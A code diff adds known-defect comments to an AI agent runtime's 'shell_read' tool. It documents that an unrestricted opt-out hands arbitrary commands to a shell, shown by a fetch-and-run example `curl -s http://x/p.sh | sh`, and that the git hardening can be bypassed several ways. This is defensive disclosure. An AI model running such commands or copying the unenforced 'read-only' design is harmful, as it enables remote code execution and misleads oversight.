@@ -5,7 +5,7 @@ State-changing shell remains a separate placeholder.
 
 Safety model for shell_read:
 - Model-originated calls execute directly and are recorded in tool_runs/events.
-- Only normalized whitelist matches execute.
+- Only normalized whitelist matches execute, unless the owner opted out below.
 - Scrubbed environment, bounded runtime, bounded output, optional cwd that
   must stay inside the approved roots.
 
@@ -14,9 +14,20 @@ carrying an argument the operator did not pre-register is refused. That is the
 right default for a shared runtime and useless for a personal one: the live log
 shows DAN refused `ls -la ~/Documents/.develop`. The owner of a local,
 localhost-only runtime can therefore opt out with ``unrestricted=True``
-(config: ``security.shell_read_unrestricted``). Opting out drops ONLY the
-allowlist — approved-root containment for cwd, the scrubbed environment, the
-git hardening below, and the runtime/output bounds all stay in force.
+(config: ``security.shell_read_unrestricted``).
+
+KNOWN DEFECT (2026-07-21): that opt-out is not the narrow change it sounds
+like, because the allowlist was the ONLY barrier in front of the shell. Nothing
+gates this tool — ``ToolPermissionPolicy.decide`` returns ALLOW for every risk
+class and every source — and ``run`` hands the command to
+``subprocess.run(..., shell=True)`` with no metacharacter handling, so
+``shell_read {"command": "curl -s http://x/p.sh | sh"}`` executes. Of the
+guarantees listed above, only the scrubbed environment and the runtime/output
+bounds survive intact: approved-root containment binds ``cwd``, never argv, and
+the git hardening stops being exhaustive (the ``argv[0] == "git"`` test in
+``run``). The tool still reports ``risk="shell_read"`` and describes itself to
+the model as read-only.
+docs/reviews/2026-07-21-restart-orphan-shell-review.md §2-§5.
 """
 
 from __future__ import annotations
@@ -80,6 +91,10 @@ _GIT_ARGV_HARDENING = (
 
 class ShellReadTool(Tool):
     name = "shell_read"
+    # KNOWN DEFECT: this text and the `command` schema below are class
+    # attributes, so the model is told "allowlisted" and "read-only" even when
+    # the instance was built with unrestricted=True and neither is true. The
+    # brain plans against a constraint that is not enforced. Review §2.
     description = (
         "Run one configured read-only allowlisted command and return bounded "
         "stdout/stderr; optional cwd must stay inside DAN-approved roots."
@@ -126,6 +141,14 @@ class ShellReadTool(Tool):
         # Reassembled through shlex.quote: the string goes back to a shell, so
         # an allowlist entry carrying a space or a quote must not be re-parsed
         # into extra words.
+        # KNOWN DEFECT: this argv[0] test was exhaustive only while the
+        # allowlist held commands to a fixed set of literals. With
+        # unrestricted=True, `/usr/bin/git status`, `cd sub && git status`,
+        # `env git status` and `sh -c 'git status'` all reach git without the
+        # hardening below — which is exactly the arbitrary code execution the
+        # comment above _GIT_ENV_HARDENING describes. The new test only covers
+        # the literal `git status --short`, so it passes over the hole.
+        # Review §3.
         argv_check = shlex.split(normalized)
         if argv_check and argv_check[0] == "git":
             hardening = " ".join(_GIT_ARGV_HARDENING)
